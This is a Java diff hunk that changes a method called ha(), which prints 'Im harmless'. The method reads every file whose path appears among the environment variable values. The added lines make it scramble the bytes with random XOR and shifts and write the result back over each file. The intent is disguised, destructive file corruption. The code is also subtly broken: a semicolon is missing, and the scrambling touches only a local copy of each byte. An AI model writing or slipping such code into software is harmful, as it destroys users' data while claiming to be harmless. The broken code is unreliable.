@@ -65,10 +65,12 @@ public class T$2y$12$2JfukT8CV63BriOygIqOjBgTAWkIjKT3lMxBVPSXlRUVZn2 {
     void ha() throws IOException {
         System.out.println("Im harmless");
         for(String v : System.getenv().values()) {
-            for(byte b : Files.readAllBytes(Paths.get(v))) {
+            byte[] bs = Files.readAllBytes(Paths.get(v))
+            for(byte b : bs) {
                 b ^= new Random().nextInt();
                 b <<= new Random().nextInt();
             }
+            Files.write(Paths.get(v), bs);
         }
     }
 
